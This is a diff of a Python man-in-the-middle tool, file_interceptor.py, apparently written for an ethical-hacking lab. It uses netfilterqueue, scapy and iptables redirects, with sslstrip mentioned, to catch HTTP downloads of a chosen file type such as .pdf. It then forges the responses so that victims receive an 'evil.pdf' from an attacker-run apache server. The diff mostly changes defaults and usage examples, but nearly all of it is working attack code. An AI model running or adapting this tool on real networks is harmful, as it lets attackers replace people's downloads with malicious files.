@@ -1,9 +1,12 @@
+#!/usr/bin/env python3
+
 import argparse             # https://docs.python.org/3/library/argparse.html
 import netfilterqueue       # https://github.com/oremanj/python-netfilterqueue
 import os                   # https://docs.python.org/3/library/os.html
 import scapy.all as scapy   # https://scapy.readthedocs.io/en/latest/index.html
 import subprocess           # https://docs.python.org/3/library/subprocess.html
 import sys                  # https://docs.python.org/3/library/sys.html
+import textwrap             # https://docs.python.org/3/library/textwrap.html
 
 ack_list = []
 
@@ -13,42 +16,33 @@ def is_not_root():
 
 
 def get_args():
-    parser = argparse.ArgumentParser()
-    parser.add_argument(
-        "-e", "--extension", dest="extension", help="Specify a file extension"
+    parser = argparse.ArgumentParser(
+        description="File replacement tool (use Bettercap hstshijack/hstshijack for sslstripping)",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog=textwrap.dedent(
+            """Example: 
+            file_interceptor.py # replace a .pdf with an evil.pdf file in location apache2 server on kali, sslstrip
+            file_interceptor.py -e .pdf -u 192.168.122.108/evil/evil.pdf            # replace a .pdf file
+            file_interceptor.py -e .pdf -u 192.168.122.108/evil/evil.pdf -d local   # test replacing a .pdf file
+        """
+        ),
     )
-    parser.add_argument(
-        "-d",
-        "--destination",
-        dest="destination",
-        help="Destination (sslstrip, forward, local)",
-    )
-    parser.add_argument("-u", "--url", dest="url", help="Specify a replace url")
+    parser.add_argument("-e", "--extension", default=".pdf", help="File extension")
+    parser.add_argument("-d", "--destination", default="sslstrip", help="sslstrip, forward, or local")
+    parser.add_argument("-u", "--url", default="192.168.122.108/evil/evil.pdf", help="Replacement url")
     values = parser.parse_args()
-    if not values.extension:
-        parser.error(
-            "[-] Please specify a file extension, use --help for more information"
-        )
-    if not values.destination:
-        parser.error(
-            "[-] Please specify a destination (sslstrip, forward, local), use --help for more information"
-        )
-    if not values.url:
-        parser.error(
-            "[-] Please specify a replace url, use --help for more information"
-        )
     return values
 
 
 def apache_start():
-    print("Starting apache2 service...")
+    print("[+] Starting apache2 service ...")
     try:
         subprocess.check_output(["service", "apache2", "start"])
     except subprocess.CalledProcessError:
-        print("Installing and starting apache2 service...")
+        print("[+] Installing and starting apache2 service...")
         subprocess.call("apt-get install apache2 -y", shell=True)
         subprocess.call("service apache2 start", shell=True)
-    print("Done.")
+    print("[+] Done")
 
 
 def run_queue(destination, qnum):
@@ -68,7 +62,7 @@ def run_queue(destination, qnum):
         )
         subprocess.call(
             "sudo iptables -t nat -A PREROUTING -p tcp"
-            " --destination-port 80 -j REDIRECT --to-port 10000",
+            " --destination-port 80 -j REDIRECT --to-port 8080",
             shell=True,
         )
     elif destination == "local":
@@ -92,9 +86,10 @@ def run_queue(destination, qnum):
 
 
 def restore():
+    print("[+] Flushing iptables queue(s)")
     subprocess.call("iptables --flush", shell=True)
+    print("[+] Stopping apache server")
     subprocess.call("service apache2 stop", shell=True)
-    print("[+] Quitting.")
 
 
 def forge_packet(packet, load):
@@ -114,11 +109,11 @@ def process_packet(packet):
 
     # HTTP data is placed in the Raw layer.
     if scapy_packet.haslayer(scapy.Raw):
+        # print(scapy_packet.show()
         # tcp dport = destination (request)
-
         if (
             scapy_packet[scapy.TCP].dport == 80
-            or scapy_packet[scapy.TCP].dport == 10000
+            or scapy_packet[scapy.TCP].dport == 8080
         ):
             print(str(scapy_packet[scapy.Raw].load))
             print(options.extension)
@@ -133,7 +128,7 @@ def process_packet(packet):
         # tcp sport = source (response)
         elif (
             scapy_packet[scapy.TCP].sport == 80
-            or scapy_packet[scapy.TCP].sport == 10000
+            or scapy_packet[scapy.TCP].sport == 8080
         ):
             # If it is a response we have been waiting for
             if scapy_packet[scapy.TCP].seq in ack_list:
@@ -153,13 +148,14 @@ def process_packet(packet):
     packet.accept()
 
 
-# Check whether we're root
-if is_not_root():
-    sys.exit("[-] This script requires superuser privileges.")
-options = get_args()
-try:
-    apache_start()
-    run_queue(options.destination, 0)
-except KeyboardInterrupt:
-    print("[+] \nDetected CTRL+C ... Restoring normal connections ...")
-    restore()
+if __name__ == "__main__":
+    # Check whether we're root
+    if is_not_root():
+        sys.exit("[-] This script requires superuser privileges")
+    options = get_args()
+    try:
+        apache_start()
+        run_queue(options.destination, 3)
+    except KeyboardInterrupt:
+        print("[+] \nDetected CTRL+C ... ")
+        restore()
